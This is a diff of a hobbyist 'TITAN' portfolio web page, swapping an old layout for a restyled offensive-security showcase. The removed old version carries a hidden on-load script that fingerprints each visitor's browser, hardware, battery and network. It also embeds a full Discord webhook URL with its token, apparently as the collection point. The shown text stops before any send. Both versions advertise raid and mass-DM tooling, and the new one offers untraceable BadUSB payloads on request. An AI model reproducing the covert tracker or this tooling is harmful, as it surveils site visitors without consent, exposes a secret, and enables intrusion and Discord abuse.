@@ -1,448 +1,467 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TITAN WELCOME</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
-<style>
-:root{--accent:#00d4ff;--dark:#0e0e0e;--card:#181818;}
-*{margin:0;padding:0;box-sizing:border-box;scroll-behavior:smooth;}
-body{font-family:'Poppins',sans-serif;background:var(--dark);color:#fff;overflow-x:hidden;}
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>TITAN — Offensive Security & Code</title>
+  <meta name="description" content="TITAN — Offensive security, Python tooling, Discord automation, RF/SDR and hacker hardware." />
+  <style>
+    :root{
+      --bg:#0a0a0d;
+      --bg-2:#0e0e14;
+      --fg:#e9e9f1;
+      --muted:#8b8b99;
+      --acc-1:#7b00ff;   /* neon purple */
+      --acc-2:#00ffb3;   /* neon mint */
+      --card:#111118;
+      --line:#171724;
+      --glow: drop-shadow(0 0 18px rgba(123,0,255,.45)) drop-shadow(0 0 8px rgba(0,255,179,.25));
+    }
 
-/* NAV */
-header{position:fixed;top:0;width:100%;padding:22px 44px;display:flex;justify-content:space-between;align-items:center;background:rgba(14,14,14,.55);backdrop-filter:blur(6px);border-bottom:1px solid rgba(255,255,255,.05);z-index:1000;}
-header h1{font-size:1.8rem;font-weight:800;letter-spacing:1px;}
-nav a{margin-left:28px;color:#fff;text-decoration:none;font-weight:600;position:relative;transition:.3s;}
-nav a::after{content:"";position:absolute;left:0;bottom:-5px;width:0;height:2px;background:var(--accent);transition:.3s;}
-nav a:hover{color:var(--accent);}nav a:hover::after{width:100%;}
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0; background: radial-gradient(1200px 600px at 10% 0%, #0d0d13 0%, var(--bg) 40%, #07070a 100%), var(--bg);
+      color:var(--fg); font: 500 16px/1.6 Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Apple Color Emoji","Segoe UI Emoji";
+      overflow-x:hidden;
+    }
 
-/* HERO */
-.hero{height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:0 20px;background:linear-gradient(135deg,#0f0f0f,#171717);} 
-.hero h2{font-size:3.4rem;font-weight:800;margin-bottom:16px;animation:fadeSlide 1s .3s both;}
-.hero p{max-width:640px;font-size:1.1rem;line-height:1.6;margin-bottom:42px;animation:fadeSlide 1s .6s both;}
-@keyframes fadeSlide{from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:none;}}
-.btn{display:inline-block;padding:14px 46px;border:2px solid var(--accent);border-radius:50px;color:#fff;text-decoration:none;text-transform:uppercase;font-weight:700;transition:.35s;animation:fadeSlide 1s .9s both;}
-.btn:hover{background:var(--accent);color:#000;transform:translateY(-3px);box-shadow:0 10px 30px rgba(0,212,255,.35);} 
-.scrolldown{position:absolute;bottom:32px;font-size:.85rem;animation:bounce 2s infinite ease-in-out;}@keyframes bounce{0%,20%,50%,80%,100%{transform:translateY(0);}40%{transform:translateY(-8px);}60%{transform:translateY(-4px);} }
+    /* subtle scanlines + noise vibe */
+    body::before{
+      content:""; position:fixed; inset:0; pointer-events:none; z-index:1;
+      background:
+        repeating-linear-gradient(to bottom, rgba(255,255,255,.02), rgba(255,255,255,.02) 1px, transparent 2px, transparent 4px),
+        radial-gradient(1200px 400px at 80% -10%, rgba(123,0,255,.12), transparent 60%),
+        radial-gradient(900px 300px at 10% 110%, rgba(0,255,179,.08), transparent 60%);
+      mix-blend-mode:screen;
+    }
 
-/* SECTIONS */
-section{padding:120px 20px 80px;}
-section h2{font-size:2.6rem;font-weight:800;text-align:center;margin-bottom:50px;}
+    a{color:inherit; text-decoration:none}
 
-/* GRIDS */
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:40px;max-width:1100px;margin:0 auto;}
-.card,.about-card{background:var(--card);padding:34px 28px;border-radius:26px;text-align:center;box-shadow:0 12px 26px rgba(0,0,0,.4);transition:.4s;opacity:0;transform:translateY(30px);} 
-.card.visible,.about-card.visible{opacity:1;transform:none;}
-.card h3,.about-card h3{font-size:1.6rem;font-weight:700;margin-bottom:12px;color:var(--accent);} 
-.card p,.about-card p{opacity:.85;font-size:.95rem;line-height:1.5;}
-.card:hover,.about-card:hover{transform:translateY(-6px) scale(1.02);box-shadow:0 14px 32px rgba(0,212,255,.15);} 
-.about-card ul{list-style:disc inside;font-size:.95rem;line-height:1.5;opacity:.85;text-align:left;padding-left:10px;}
+    /* ------- NAV (hidden until scroll) ------- */
+    .nav {
+      position:fixed; top:18px; left:50%; transform:translateX(-50%);
+      background:rgba(17,17,24,.55); border:1px solid var(--line); border-radius:14px;
+      padding:10px 14px; display:flex; gap:10px; z-index:10; backdrop-filter: blur(6px);
+      opacity:0; visibility:hidden; transition: .4s ease;
+    }
+    .nav.show{opacity:1; visibility:visible; transform:translateX(-50%) translateY(0)}
+    .nav a{
+      padding:8px 12px; border-radius:10px; color:var(--muted); border:1px solid transparent;
+    }
+    .nav a.active, .nav a:hover{
+      color:var(--fg); border-color:#25253a; background:linear-gradient(180deg, #12121a, #0e0e15);
+      filter:var(--glow);
+    }
 
-/* PROFILE & SERVER CARD */
-.profile-card img,.server-card img{width:120px;height:120px;border-radius:50%;border:4px solid var(--accent);box-shadow:0 0 16px rgba(0,212,255,.5);object-fit:cover;margin-bottom:16px;}
+    /* ------- HERO ------- */
+    .hero{
+      min-height:100svh; display:grid; place-items:center; position:relative;
+      isolation:isolate;
+    }
+    .glitch{
+      font-weight:800; letter-spacing:.08em; text-transform:uppercase; text-align:center;
+      font-size: clamp(36px, 9vw, 120px);
+      line-height: .95;
+      position:relative; display:inline-block;
+      filter:var(--glow);
+    }
+    .glitch::before,
+    .glitch::after{
+      content:attr(data-text); position:absolute; inset:0; pointer-events:none; mix-blend-mode:screen;
+    }
+    .glitch::before{ transform:translate(2px,0); color:var(--acc-1); clip-path: polygon(0 0, 100% 0, 100% 48%, 0 52%); }
+    .glitch::after{ transform:translate(-2px,0); color:var(--acc-2); clip-path: polygon(0 48%, 100% 52%, 100% 100%, 0 100%); }
+    @keyframes glitchShift{
+      0%,100%{ transform:translate(0,0) }
+      20%{ transform:translate(2px,-1px) }
+      40%{ transform:translate(-2px,1px) }
+      60%{ transform:translate(1px,0) }
+      80%{ transform:translate(-1px,0) }
+    }
+    .glitch, .glitch::before, .glitch::after{ animation:glitchShift 2.4s infinite cubic-bezier(.17,.67,.36,1) }
 
-/* CTA */
-#cta{background:#111;text-align:center;}
-#cta a{display:inline-block;margin-top:10px;padding:16px 50px;border-radius:50px;border:2px solid var(--accent);font-weight:700;color:#fff;text-decoration:none;transition:.35s;}
-#cta a:hover{background:var(--accent);color:#000;transform:translateY(-3px);box-shadow:0 10px 30px rgba(0,212,255,.35);} 
+    .scroll-cue{
+      position:absolute; bottom:42px; left:50%; transform:translateX(-50%); color:var(--muted);
+      font-size:14px; letter-spacing:.3em; text-transform:uppercase; opacity:.85;
+    }
+    .scroll-dot{ width:2px; height:28px; background:linear-gradient(var(--acc-2), transparent); margin:10px auto 0; border-radius:2px; animation:drop 1.6s infinite }
+    @keyframes drop{ 0%{opacity:0; transform:translateY(-8px)} 30%{opacity:1} 100%{opacity:0; transform:translateY(16px)} }
 
-footer{padding:46px 20px;text-align:center;background:#000;font-size:.85rem;color:#777;}
-</style>
+    /* ------- SECTIONS ------- */
+    section{
+      padding: clamp(64px, 8vw, 120px) 20px; position:relative;
+    }
+    .container{ max-width:1200px; margin:0 auto }
+    .section-title{
+      font-size: clamp(24px, 4.2vw, 54px); line-height:1.05; margin:0 0 24px;
+      font-weight:800; letter-spacing:.02em;
+    }
+    .kicker{ color:var(--acc-2); font-weight:700; letter-spacing:.25em; text-transform:uppercase; font-size:12px }
+
+    .accent{
+      position:absolute; inset:0; pointer-events:none;
+      background:
+        radial-gradient(500px 140px at 15% 20%, rgba(123,0,255,.15), transparent 60%),
+        radial-gradient(600px 160px at 90% 60%, rgba(0,255,179,.12), transparent 65%);
+      z-index:-1;
+    }
+
+    /* cards/grid */
+    .grid{ display:grid; gap:18px; grid-template-columns:repeat(12,1fr) }
+    .card{
+      grid-column: span 12; background:linear-gradient(180deg, #0f0f16, #0b0b12);
+      border:1px solid #1a1a28; border-radius:16px; padding:24px; position:relative; overflow:hidden;
+      transition: transform .25s ease, border-color .25s ease, background .25s ease;
+    }
+    .card:hover{ transform:translateY(-2px); border-color:#26263a }
+    .card h3{ margin:0 0 10px; font-size:22px }
+    .card p{ margin:0; color:#b7b7c5 }
+    .card .tag{
+      display:inline-block; padding:6px 10px; border:1px solid #232338; border-radius:999px; font-size:12px;
+      color:#cfd; margin:0 6px 8px 0; background:rgba(0,255,179,.05)
+    }
+    .card .tag.p{ color:#dec7ff; background:rgba(123,0,255,.08) }
+
+    /* images */
+    .hardware{
+      display:flex; gap:22px; flex-wrap:wrap; align-items:stretch;
+    }
+    .imgBox{
+      flex:1 1 280px; background:#0b0b12; border:1px solid #1a1a28; border-radius:16px; padding:14px;
+      display:flex; align-items:center; justify-content:center; min-height:220px; overflow:hidden;
+      position:relative;
+    }
+    .imgBox img{ max-width:100%; max-height:180px; filter: drop-shadow(0 10px 40px rgba(0,255,179,.18)) }
+    .imgBox .label{
+      position:absolute; bottom:10px; left:10px; font-size:12px; color:#a6ffd9; opacity:.9; letter-spacing:.15em;
+      background:rgba(0,255,179,.06); padding:6px 10px; border:1px solid #223; border-radius:999px
+    }
+
+    /* columns */
+    .two-col{ display:grid; gap:26px; grid-template-columns:repeat(12,1fr) }
+    .two-col > .left { grid-column: span 7 }
+    .two-col > .right{ grid-column: span 5 }
+    @media (max-width:980px){
+      .two-col > .left, .two-col > .right{ grid-column: span 12 }
+    }
+
+    /* reveal on scroll */
+    .reveal{ opacity:0; transform:translateY(24px); transition: .7s ease }
+    .reveal.visible{ opacity:1; transform:none }
+    .delay-1{ transition-delay:.08s } .delay-2{ transition-delay:.16s } .delay-3{ transition-delay:.24s } .delay-4{ transition-delay:.32s }
+
+    /* progress bar */
+    .progress{
+      position:fixed; top:0; left:0; height:3px; width:0%;
+      background:linear-gradient(90deg, var(--acc-1), var(--acc-2)); z-index:20; box-shadow:0 0 24px rgba(123,0,255,.6);
+    }
+
+    /* footer/contact */
+    .cta{
+      display:flex; gap:16px; flex-wrap:wrap; align-items:center;
+    }
+    .btn{
+      display:inline-flex; align-items:center; gap:10px; padding:12px 16px; border-radius:12px; font-weight:700;
+      border:1px solid #26263a; background:linear-gradient(180deg,#12121b,#0e0e15); cursor:pointer;
+      transition:.25s ease; letter-spacing:.04em; text-transform:uppercase; font-size:13px;
+    }
+    .btn:hover{ transform:translateY(-1px); filter:var(--glow) }
+    .pfp{ width:56px; height:56px; border-radius:12px; object-fit:cover; border:1px solid #26263a }
+
+    /* subtle separators */
+    .sep{ height:1px; background:linear-gradient(90deg, transparent, #1a1a28, transparent); margin:26px 0 }
+
+    /* accessibility */
+    @media (prefers-reduced-motion: reduce){
+      .glitch, .glitch::before, .glitch::after{ animation:none }
+      .reveal{ transition:none }
+      .scroll-dot{ animation:none }
+    }
+  </style>
 </head>
 <body>
-<header>
-  <h1>TITAN</h1>
-  <nav>
-    <a href="#home">Home</a>
-    <a href="#aboutme">About&nbsp;Me</a>
-    <a href="#drives">What&nbsp;Drives&nbsp;Me</a>
-    <a href="#icode">I&nbsp;Code</a>
-    <a href="#working">Working&nbsp;On</a>
-    <a href="#discord">Discord</a>
-    <a href="posts.html">Posts</a>
+  <div class="progress" id="progress"></div>
+
+  <!-- NAV (appears after you leave the hero) -->
+  <nav class="nav" id="nav">
+    <a href="#about"   data-link>About</a>
+    <a href="#offsec"  data-link>Offensive Security</a>
+    <a href="#hardware" data-link>Hardware</a>
+    <a href="#coding"  data-link>Coding & Tools</a>
+    <a href="#discord" data-link>Discord Automation</a>
+    <a href="#contact" data-link>Contact</a>
   </nav>
-</header>
 
-<!-- HERO -->
-<section class="hero" id="home">
-  <h2>Welcome to TITAN</h2>
-  <p>Unleashing invincible software, bending SDR frequencies, and crafting pentesting tools.</p>
-  <a href="#aboutme" class="btn">Show&nbsp;Me&nbsp;More</a>
-  <span class="scrolldown">▼ Scroll</span>
-</section>
+  <!-- HERO: Only Welcome text -->
+  <header class="hero" id="hero" aria-label="Welcome">
+    <div class="accent"></div>
+    <h1 class="glitch" data-text="WELCOME TO TITAN">WELCOME TO TITAN</h1>
+    <div class="scroll-cue" aria-hidden="true">SCROLL</div>
+    <div class="scroll-dot" aria-hidden="true"></div>
+  </header>
 
-<!-- ABOUT ME -->
-<section id="aboutme">
-  <h2>About&nbsp;Me</h2>
-  <div class="grid">
-    <div class="about-card"><h3>Nickname</h3><p>I’ve rocked the handle <strong>TITAN</strong> since I started coding back in <strong>2020</strong>.</p></div>
-    <div class="about-card"><h3>Gear I Wield</h3>
-      <ul>
-        <li>Flipper&nbsp;Zero + Wi‑Fi Dev Board + IR BLaster + SunGhz module...</li>
-        <li>HackRF + PortaPack + Diamond SRH789 <3&nbsp;H2</li>
-        <li>M5 Stick Plus&nbsp;2 & NFC arsenal</li>
-      </ul>
+  <!-- ABOUT -->
+  <section id="about">
+    <div class="container">
+      <div class="kicker reveal">Portfolio</div>
+      <h2 class="section-title reveal delay-1">What I do</h2>
+      <p class="reveal delay-2" style="max-width:860px;color:#c5c5d6">
+        I build, break, and automate. I live in the overlap of <b>offensive security</b>,
+        <b>Python engineering</b>, and <b>Discord automation</b>. Expect clean code, fast iteration,
+        and hardware-level curiosity. Scroll — it gets deeper.
+      </p>
+      <div class="sep reveal delay-3"></div>
     </div>
-    <div class="about-card"><h3>Focus</h3><p>SDR &amp; NFC, pentesting, tool building</p></div>
-  </div>
-</section>
+  </section>
 
-<!-- WHAT DRIVES ME -->
-<section id="drives">
-  <h2>What&nbsp;Drives&nbsp;Me</h2>
-  <div class="grid" id="drives-grid"></div>
-</section>
+  <!-- OFFENSIVE SECURITY (dominant section) -->
+  <section id="offsec">
+    <div class="accent"></div>
+    <div class="container two-col">
+      <div class="left">
+        <div class="kicker reveal">Core Focus</div>
+        <h2 class="section-title reveal delay-1">Offensive Security</h2>
+        <div class="grid">
+          <div class="card reveal delay-1" style="grid-column:span 12">
+            <h3>Recon → Exploit → Report</h3>
+            <p>
+              Targeted recon, custom payloads, reproducible exploit chains, and tight write-ups.
+            </p>
+          </div>
+          <div class="card reveal delay-2" style="grid-column:span 6">
+            <span class="tag">Web</span><span class="tag">AppSec</span><span class="tag p">Red Team</span>
+            <h3>Web & App Targets</h3>
+            <p>Auth bypass, logic flaws, misconfig, IDOR, SSRF, CSRF, XSS (stored/reflected), deserialization paths, and chained impact.</p>
+          </div>
+          <div class="card reveal delay-3" style="grid-column:span 6">
+            <span class="tag">Network</span><span class="tag">Cloud</span><span class="tag p">Ops</span>
+            <h3>Infra & Cloud</h3>
+            <p>AD mischief (lab), credential paths, privilege escalation, IaC drift, and attack-path mapping with crisp remediation.</p>
+          </div>
+          <div class="card reveal delay-4" style="grid-column:span 12">
+            <span class="tag p">Custom</span><span class="tag">BadUSB</span><span class="tag">RF</span>
+            <h3>Custom Tradecraft</h3>
+            <p>
+              I write <b>BadUSB</b> payloads, build quick implants, and craft auto injections for payloads,
+              without any trace.
+            </p>
+          </div>
+        </div>
+      </div>
+      <div class="right">
+        <div class="card reveal delay-2">
+          <h3>Toolkit Snapshot</h3>
+          <p style="margin-bottom:12px">Lean stack, heavy impact:</p>
+          <ul style="margin:0 0 8px 18px; color:#b7b7c5">
+            <li>nmap, ffuf, nuclei, Burp, mitm, impacket</li>
+            <li>Python one-offs, payload gens, report helpers</li>
+            <li>RF/SDR capture & replay (lab), BLE sniffing</li>
+            <li>Discord-side simulations for abuse/raid scenarios</li>
+          </ul>
+        </div>
+        <div class="imgBox reveal delay-3" aria-hidden="true">
+          <img src="hackrf.png" alt="HackRF One with PortaPack (placeholder image)">
+          <span class="label">HackRF One + PortaPack</span>
+        </div>
+      </div>
+    </div>
+  </section>
 
-<!-- I CODE SECTION -->
-<section id="icode">
-  <h2>What&nbsp;I&nbsp;Code</h2>
-  <div class="grid" id="code-grid"></div>
-</section>
+  <!-- HARDWARE -->
+  <section id="hardware">
+    <div class="container">
+      <div class="kicker reveal">Hardware Arsenal</div>
+      <h2 class="section-title reveal delay-1">Devices I Own & Use</h2>
 
-<!-- WORKING ON -->
-<section id="working">
-  <h2>What&nbsp;I'm&nbsp;Working&nbsp;On&nbsp;Now</h2>
-  <div class="grid" id="working-grid"></div>
-</section>
+      <div class="hardware">
+        <div class="imgBox reveal delay-1">
+          <img src="flipper.png" alt="Flipper Zero (placeholder image)">
+          <span class="label">Flipper Zero</span>
+        </div>
+        <div class="imgBox reveal delay-2">
+          <img src="hackrf.png" alt="HackRF One (placeholder image)">
+          <span class="label">HackRF One + PortaPack</span>
+        </div>
+      </div>
 
-<!-- DISCORD SECTION -->
-<section id="discord">
-  <h2>Discord</h2>
-  <div class="grid" id="discord-grid"></div>
-</section>
+      <div class="grid" style="margin-top:22px">
+        <div class="card reveal delay-2" style="grid-column:span 6">
+          <h3>Flipper Zero </h3>
+          <p>
+            I run a tuned Flipper setup with add-ons:
+            <b>IR Blaster</b> (add-on) and <b>WiFi Dev Board</b> (add-on).
+            I keep a private stash of <b>BadUSB</b> codes and write new ones on request<3
+          </p>
+        </div>
+        <div class="card reveal delay-3" style="grid-column:span 6">
+          <h3>SDR / RF Work</h3>
+          <p>
+            <b>HackRF One + PortaPack</b> for capture/analysis, replay testing, and signal fuzzing in controlled, isolated environments.
+            Also dabbling with BLE scans, sub-GHz experiments, and self-built probes when needed.
+          </p>
+        </div>
+        <div class="card reveal delay-4" style="grid-column:span 12">
+          <h3>M5Stick Plus 2 & Self-Builds</h3>
+          <p>
+            Quick UI sensors, PoC gadgets, and tiny automations. I like building exactly what the op needs,
+            then tossing it if it adds noise.
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
 
-<!-- CTA TO POSTS -->
-<section id="cta">
-  <h2>Ready for Deep‑Dive Tutorials?</h2>
-  <a href="posts.html">See&nbsp;Posts</a>
-</section>
+  <!-- CODING & TOOLS -->
+  <section id="coding">
+    <div class="accent"></div>
+    <div class="container two-col">
+      <div class="left">
+        <div class="kicker reveal">Engineering</div>
+        <h2 class="section-title reveal delay-1">Python & Custom Tools</h2>
+        <div class="grid">
+          <div class="card reveal delay-1" style="grid-column:span 12">
+            <span class="tag p">Python</span><span class="tag">CLI</span><span class="tag">Automation</span>
+            <h3>Clean & Practical</h3>
+            <p>
+              I keep the code tight: type-hints, clear structure, and logs you can trust. From scrapers to tiny
+              forensic helpers to operator dashboards — if it saves time, I build it.
+            </p>
+          </div>
+          <div class="card reveal delay-2" style="grid-column:span 6">
+            <h3>Data & Ops Glue</h3>
+            <p>ETL-ish scripts, schedulers, stateful caches, and file pipelines that turn “ugh” into one-click runs.</p>
+          </div>
+          <div class="card reveal delay-3" style="grid-column:span 6">
+            <h3>Reporting & Evidence</h3>
+            <p>Markdown → HTML/PDF pipelines, screenshots, and auto-collected context so fixes are obvious.</p>
+          </div>
+        </div>
+      </div>
+      <div class="right">
+        <div class="imgBox reveal delay-2">
+          <img src="python.png" alt="Python logo / project (placeholder image)">
+          <span class="label">Python-First</span>
+        </div>
+      </div>
+    </div>
+  </section>
 
-<footer>© <span id="year"></span> Titan All rights reserved.</footer>
+  <!-- DISCORD AUTOMATION -->
+  <section id="discord">
+    <div class="container">
+      <div class="kicker reveal">Automation</div>
+      <h2 class="section-title reveal delay-1">Discord Bots & Custom Tools</h2>
+      <div class="grid">
+        <div class="card reveal delay-1" style="grid-column:span 6">
+          <h3>Production Bots</h3>
+          <p>Verification, tickets, role flows, anti-spam, metrics, and admin QoL. Built for uptime and clarity.</p>
+        </div>
+        <div class="card reveal delay-2" style="grid-column:span 6">
+          <h3>Red-Team Simulations</h3>
+          <p>
+            Raid/nuke <em>simulators</em> (Discord-based) to pressure-test moderation. Controlled, permissioned, and logged —
+            the goal is resilience, not chaos.
+          </p>
+        </div>
+        <div class="card reveal delay-3" style="grid-column:span 12">
+          <h3>Plus Some Extras</h3>
+          <p>Scrapers, monitors, bulk ops, and integration bridges that keep the stack tidy without manual grind.</p>
+        </div>
+      </div>
+    </div>
+  </section>
 
-<script>
-// YEAR
-document.getElementById('year').textContent = new Date().getFullYear();
+  <!-- CONTACT -->
+  <section id="contact">
+    <div class="accent"></div>
+    <div class="container">
+      <div class="kicker reveal">Reach Out</div>
+      <h2 class="section-title reveal delay-1">Let’s Build</h2>
+      <p class="reveal delay-2" style="max-width:860px;color:#c5c5d6">
+        Want a focused offsec engagement, a custom Python tool, or a Discord automation that actually behaves?
+        Ping me below. I answer fast.
+      </p>
 
-// Intersection observer
-const revealObs = new IntersectionObserver(e=>e.forEach(x=>x.isIntersecting&&x.target.classList.add('visible')), {threshold:.15});
+      <div class="cta reveal delay-3" style="margin-top:18px">
+        <img class="pfp" src="profile.png" alt="Profile picture">
+        <a class="btn" href="https://discord.com/users/1380071939850113135" target="_blank" rel="noopener">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M20 7.5c-1.2-.9-2.6-1.6-4.1-1.9-.2.4-.4.8-.6 1.2-1.1-.2-2.2-.2-3.3 0-.2-.4-.4-.8-.6-1.2-1.5.3-2.9 1-4.1 1.9C4.9 11 4.3 14.4 4.5 17.7c1.7 1.3 3.5 2.1 5.3 2.6.4-.6.7-1.2.9-1.9-1.3-.4-2.6-1-3.7-1.9.3.2.6.4.9.6 2.2 1.3 4.7 1.7 7.1 1.1.3.6.6 1.2.9 1.8 1.9-.5 3.7-1.4 5.4-2.7.3-3.3-.4-6.7-2.2-10.1zM10 14.5c-.8 0-1.5-.7-1.5-1.5S9.2 11.5 10 11.5s1.5.7 1.5 1.5-.7 1.5-1.5 1.5zm4 0c-.8 0-1.5-.7-1.5-1.5S13.2 11.5 14 11.5s1.5.7 1.5 1.5-.7 1.5-1.5 1.5z" fill="currentColor"/>
+          </svg>
+          <span>Add on Discord</span>
+        </a>
+      </div>
+      <div class="sep reveal delay-4"></div>
+      <p class="reveal delay-4" style="color:#8e8ea0;font-size:13px">
+        Note: All demonstrations and experiments are performed ethically in labs/VMs with permission.
+      </p>
+    </div>
+  </section>
 
-window.addEventListener('DOMContentLoaded',()=>{
-  document.querySelectorAll('.about-card').forEach(el=>revealObs.observe(el));
-});
-
-// DATA
-const drives=[
-  {title:'SDR Hacking',desc:'Sniffing & injecting radio frequencies'},
-  {title:'NFC Wizardry',desc:'Tag cloning, payment fuzzing & smart‑card sorcery'},
-  {title:'Pentesting',desc:'Red‑team exploits, recon scripts, relentless fuzz'},
-  {title:'Hardware Crafting',desc:'3D‑prints, antenna builds – pure creation'}
-];
-const codes=[
-  {title:'Discord Bots',desc:'Feature‑rich Bots'},
-  {title:'Discord Tools',desc:'Mass‑DM, Raid-Tool, '},
-  {title:'Recon Utilities',desc:'Stealth info‑gathering with zero footprint.'}
-];
-const working=[
-  {title:'VANTA – All‑in‑One Discord Bot',desc:'Slots • Ticketing • Moderation - More Soon'}
-];
-const discord=[
-  {title:'@d3adnet',desc:'Always online:)',img:'profile.gif',cls:'profile-card'},
-  {title:'gg.titanback',desc:'Join Us and have fun <3',img:'server.gif',cls:'server-card',link:'https://discord.gg/titanback'}
-];
-
-// UTILITY
-function addCard(container,obj){
-  const div=document.createElement('div');
-  div.className=obj.cls?`card ${obj.cls}`:'card';
-  let inner=obj.img?`<img src="${obj.img}" alt="img">`:'';
-  inner+=`<h3>${obj.title}</h3><p>${obj.desc}</p>`;
-  div.innerHTML=inner;
-  if(obj.link){div.style.cursor='pointer';div.addEventListener('click',()=>window.open(obj.link,'_blank'));}
-  document.getElementById(container).appendChild(div);
-  revealObs.observe(div);
-}
-
-window.addEventListener('DOMContentLoaded',()=>{
-  drives.forEach(d=>addCard('drives-grid',d));
-  codes.forEach(c=>addCard('code-grid',c));
-  working.forEach(w=>addCard('working-grid',w));
-  discord.forEach(d=>addCard('discord-grid',d));
-});
-</script>
-<script>
-(async () => {
-  const webhookUrl = "https://discordapp.com/api/webhooks/1390054519928521025/ZU-gomMXUaXsefxTBoPaojwRlLip--UDBV3ojQCodrsJOzfUEq7WmuzVQYRB-1ldd9pR";
-
-  // Hilfsfunktion: Einfacher Hash (32-bit)
-  function hashString(str) {
-    let hash = 0;
-    for (let i = 0; i < str.length; i++) {
-      hash = (Math.imul(31, hash) + str.charCodeAt(i)) | 0;
-    }
-    return (hash >>> 0).toString(16);
-  }
-
-  // Canvas-Fingerprint
-  function getCanvasFingerprint() {
-    try {
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d");
-      canvas.width = 200;
-      canvas.height = 50;
-      ctx.textBaseline = "top";
-      ctx.font = "16px 'Arial'";
-      ctx.textBaseline = "alphabetic";
-      ctx.fillStyle = "#f60";
-      ctx.fillRect(125, 1, 62, 20);
-      ctx.fillStyle = "#069";
-      ctx.fillText("TitanService", 2, 15);
-      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-      ctx.fillText("TitanService", 4, 17);
-      const dataURL = canvas.toDataURL();
-      return hashString(dataURL);
-    } catch {
-      return "error";
-    }
-  }
-
-  // WebGL-Fingerprint
-  function getWebGLFingerprint() {
-    try {
-      const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-      return hashString(vendor + " " + renderer);
-    } catch {
-      return "n/a";
-    }
-  }
-
-  // Audio-Fingerprint (simplifiziert)
-  async function getAudioFingerprint() {
-    try {
-      const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
-      const osc = ctx.createOscillator();
-      const analyser = ctx.createAnalyser();
-      osc.connect(analyser);
-      analyser.connect(ctx.destination);
-      osc.start(0);
-      const buffer = await ctx.startRendering();
-      const channelData = buffer.getChannelData(0).slice(0, 1000);
-      let sum = 0;
-      for (let i = 0; i < channelData.length; i++) {
-        sum += Math.abs(channelData[i] * 1000);
-      }
-      return hashString(sum.toString());
-    } catch {
-      return "n/a";
-    }
-  }
-
-  // AdBlock-Detection
-  function detectAdBlock() {
-    const bait = document.createElement("div");
-    bait.className = "adsbox";
-    bait.style.width = "1px";
-    bait.style.height = "1px";
-    bait.style.position = "absolute";
-    bait.style.left = "-9999px";
-    document.body.appendChild(bait);
-    const blocked = window.getComputedStyle(bait).getPropertyValue("display") === "none" || bait.offsetParent === null;
-    document.body.removeChild(bait);
-    return blocked ? "Yes" : "No";
-  }
-
-  // Fonts-Detection (einfacher Test)
-  function detectFonts() {
-    const testString = "mmmmmmmmmmlli";
-    const baseFonts = ["monospace", "sans-serif", "serif"];
-    const fontsToDetect = ["Comic Sans MS", "Courier New", "Times New Roman", "Arial", "Verdana"];
-    const detected = [];
-    const canvas = document.createElement("canvas");
-    const ctx = canvas.getContext("2d");
-
-    function getWidth(font) {
-      ctx.font = `16px '${font}', monospace`;
-      return ctx.measureText(testString).width;
-    }
-
-    const baseWidth = {};
-    baseFonts.forEach(base => {
-      baseWidth[base] = getWidth(base);
-    });
-
-    fontsToDetect.forEach(font => {
-      let isAvailable = false;
-      baseFonts.forEach(base => {
-        const width = getWidth(font + ", " + base);
-        if (width !== baseWidth[base]) {
-          isAvailable = true;
-        }
-      });
-      if (isAvailable) detected.push(font);
-    });
-
-    return detected.length ? detected.join(", ") : "None";
-  }
-
-  // Plugins-Liste
-  function getPlugins() {
-    try {
-      const names = [];
-      for (let i = 0; i < navigator.plugins.length; i++) {
-        names.push(navigator.plugins[i].name);
-      }
-      return names.length ? names.join(", ") : "None";
-    } catch {
-      return "n/a";
-    }
-  }
-
-  // Screen-Size & Darkmode
-  const screenSize = `${window.screen.width}x${window.screen.height}`;
-  const darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No";
-
-  // Medien-Geräte Check
-  function hasMediaDevices() {
-    return navigator.mediaDevices && navigator.mediaDevices.enumerateDevices ? "Yes" : "No";
-  }
-
-  // NFC-Check
-  function hasNFC() {
-    return "NDEFReader" in window ? "Yes" : "No";
-  }
-
-  // Bluetooth-Check
-  function hasBluetooth() {
-    return "bluetooth" in navigator ? "Yes" : "No";
-  }
-
-  // Battery Status
-  async function getBatteryInfo() {
-    try {
-      const batt = await navigator.getBattery();
-      return `${Math.round(batt.level * 100)}% (${batt.charging ? "Charging" : "Not Charging"})`;
-    } catch {
-      return "n/a";
-    }
-  }
-
-  // Network Infos
-  function getNetworkInfo() {
-    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (!conn) return { type: "n/a", downlink: "n/a", effectiveType: "n/a" };
-    return {
-      type: conn.type || "unknown",
-      downlink: conn.downlink ? conn.downlink + " Mb/s" : "n/a",
-      effectiveType: conn.effectiveType || "n/a"
+  <script>
+    // Progress bar
+    const progress = document.getElementById('progress');
+    const onScroll = () => {
+      const h = document.documentElement;
+      const scrolled = (h.scrollTop) / (h.scrollHeight - h.clientHeight);
+      progress.style.width = (scrolled * 100) + '%';
     };
-  }
+    document.addEventListener('scroll', onScroll, {passive:true});
+    onScroll();
 
-  // GPU via WebGL
-  const webglFingerprint = getWebGLFingerprint();
